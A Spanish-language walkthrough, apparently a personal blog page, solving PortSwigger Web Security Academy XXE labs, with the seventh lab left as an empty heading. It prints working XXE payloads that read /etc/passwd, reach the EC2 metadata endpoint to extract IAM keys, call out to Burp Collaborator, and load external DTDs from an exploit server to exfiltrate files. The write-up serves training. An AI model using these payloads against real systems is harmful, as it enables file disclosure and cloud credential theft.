---
layout: default
title: "XML external entity (XXE) injection - PortSwigger"
permalink: /xxe-ps/
---

# XML external entity (XXE) injection - PortSwigger

Todos los laboratorios posteriormente expuestos los puedes encontrar para resolverlos en el siguiente link.

[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

## Índice



## 1. Lab: Exploiting XXE using external entities to retrieve files

```
Este laboratorio tiene una función "Check stock" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta.

Para resolver el laboratorio, inyecte una entidad externa XML para recuperar el contenido del /etc/passwdarchivo.
```

Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y hacemos clic en **Check stock** y buscamos el paquete en el **Http history** y lo enviamos al **Repeater**.

![](img1.png)

Entonces ahora debemos generar un payload para el ataque, el cual será el siguiente basandonos en la estructura del XML del paquete:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Y Lo probamos en el paquete para verificar si existe una respuesta válida.

![](img2.png)

Ahora, vamos al home para verificar que completamos el laboratorio.

![](img3.png)

## 2. Lab: Exploiting XXE to perform SSRF attacks

```
Este laboratorio tiene una función "Check stock" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta.

El servidor de laboratorio está ejecutando un punto final de metadatos EC2 (simulado) en la URL predeterminada, que es http://169.254.169.254/. Este punto final se puede utilizar para recuperar datos sobre la instancia, algunos de los cuales pueden ser confidenciales.

Para resolver el laboratorio, aproveche la vulnerabilidad XXE para realizar un ataque SSRF que obtenga el secret access key de IAM del servidor desde el punto final de metadatos EC2.
```

Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y hacemos clic en **Check stock** y buscamos el paquete en el **Http history** y lo enviamos al **Repeater**.

![](img4.png)

Entonces ahora debemos generar un payload para el ataque, el cual será el siguiente basandonos en la estructura del XML del paquete:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Y enviamos el paquete, observamos lo siguiente:

![](img5.png)

Recibimos como respuesta el string **latest**, lo agregamos a la url de la ip a la que queremos acceder y obtenemos la siguiente respuesta:

```
PAYLOAD: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
RESPUESTA: "Invalid product ID: meta-data"
```

Y volvemos a agregar la respuesta en la url del payload y obtenemos la siguiente respuesta:

```
"Invalid product ID: iam"
```

Y seguimos agregando todos los que nos sugiere hasta tener el siguiente payload.

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

El cual nos devuelve la siguiente respuesta:

![](img6.png)

```
"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2021-02-07T16:07:36.536751Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "mxjF9Xea2bZ9FpdxtCCU",
  "SecretAccessKey" : "wORR4gS3GaX0QzbXqFs7qAk7AyQkFvzYCVc48DDx",
  "Token" : "jy7FOMsOs523ituXLzFHQKLJsNYKdRfrCxkJFWJOqW6e9INmJ9fyn8dGi3olUWxkfkSXLdIuCFRdB6K03D56Rnrq0XYBSYqGrNt4gulNlfrSkMSxzsBwl8bzPSTXI2lTVjYAFgXbeB1U1VBPIiW243nEzoqsmUi4Zs8ZhqAqIsQ6hoZ30EMhrtbFxFNzdZMssvglji6r4CbsPxBxDb4yseYBZ3nLBUXEFIG47pXmQCwlXMfnLzKcRkBCRHSl2Dg2",
  "Expiration" : "2027-02-06T16:07:36.536751Z"
}"
```

Y los que nos piden es el **secret access key** el cual sería **wORR4gS3GaX0QzbXqFs7qAk7AyQkFvzYCVc48DDx**. Entramos al home del laboratorio desde el navegador para verificar que completamos el laboratorio.

![](img7.png)

## 3. Lab: Blind XXE with out-of-band interaction

```
Este laboratorio tiene una función "Check stock" que analiza la entrada XML pero no muestra el resultado.

Puede detectar la vulnerabilidad ciega XXE activando interacciones fuera de banda con un dominio externo.

Para resolver el laboratorio, use una entidad externa para hacer que el analizador XML emita una búsqueda de DNS y una solicitud HTTP a Burp Collaborator.
```

Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y hacemos clic en **Check stock** y buscamos el paquete en el **Http history** y lo enviamos al **Repeater**.

![](img8.png)

Entonces ahora lo que haremos será inciar el **Burp collaborator** y realizar una consulta con el siguiente payload basado en la estructura XML del paquete.

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://geyl1g8xhwzi53mt93v09dqgg7mxam.burpcollaborator.net"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

![](img9.png)

Como podemos ver, se realizó la consulta al sitio web generado con Burp Collaborator, aunque no existió ninguna respuesta por lado del servidor mas que el error de **Invalid product ID**. Entramos al home del laboratorio desde el navegador para verificar que completamos el laboratorio.

![](img10.png)

## 4. Lab: Blind XXE with out-of-band interaction via XML parameter entities

```
Este laboratorio tiene una función "Check stock" que analiza la entrada XML, pero no muestra valores inesperados y bloquea las solicitudes que contienen entidades externas regulares.

Para resolver el laboratorio, use una entidad de parámetro para hacer que el analizador XML emita una búsqueda de DNS y una solicitud HTTP a Burp Collaborator.
```

Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y hacemos clic en **Check stock** y buscamos el paquete en el **Http history** y lo enviamos al **Repeater**.

![](img11.png)

Entonces ahora lo que haremos será inciar el **Burp collaborator** y realizar una consulta con el siguiente payload basado en la estructura XML del paquete.

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://n6uo0bl4jzbk904jv3ja6ah4ivolca.burpcollaborator.net"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

![](img12.png)

Como podemos ver, se realizó la consulta al sitio web generado con Burp Collaborator, aunque no existió ninguna respuesta por lado del servidor mas que el error de **Parsing error**. Entramos al home del laboratorio desde el navegador para verificar que completamos el laboratorio.

![](img13.png)

## 5. Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

```
Este laboratorio tiene una función "Check stock" que analiza la entrada XML pero no muestra el resultado.

Para resolver el laboratorio, exfiltra el contenido del archivo /etc/hostname.
```

Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y hacemos clic en **Check stock** y buscamos el paquete en el **Http history** y lo enviamos al **Repeater**.

![](img14.png)

Así que ahora iremos al **Exploit Server** y realizamos la siguiente configuracion.

![](img15.png)

Y le damos en botón **Store**. Configuramos nuestro payload en el repeater, al siguiente valor:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://ac7a1f721e5094c980c1385d016c00bd.web-security-academy.net/malicious.dtd"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

![](img16.png)

Ahora, en la seccion de **Exploit Server** hacemos clic en **Access Log**.

![](img17.png)

Entonces obtenemos que el contenido de **/etc/hostsname** es **f681f51b2be3**. Enviamos el valor para completar el laboratorio.

![](img18.png)

## 6. Lab: Exploiting blind XXE to retrieve data via error messages

```
Este laboratorio tiene una función "Chack Stock" que analiza la entrada XML pero no muestra el resultado.

Para resolver el laboratorio, use un DTD externo para activar un mensaje de error que muestre el contenido del archivo /etc/passwd.

El laboratorio contiene un enlace a un servidor de exploits en un dominio diferente donde puede alojar su DTD malicioso.
```

Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y hacemos clic en **Check stock** y buscamos el paquete en el **Http history** y lo enviamos al **Repeater**.

![](img19.png)

Así que ahora iremos al **Exploit Server** y realizamos la siguiente configuracion.

![](img20.png)

Y le damos en botón **Store**. Configuramos nuestro payload en el repeater, al siguiente valor:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://acc61f931f0eeb97800f86cf01820027.web-security-academy.net/malicious.dtd"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

![](img21.png)

Entonces, como podemos ver, hemos obtenido el contenido del fichero **/etc/passwd** a travéz de un mensaje de error. Ahora, vamos al home para verificar que completamos el laboratorio.

![](img22.png)

## 7. Lab: Exploiting XXE to retrieve data by repurposing a local DTD

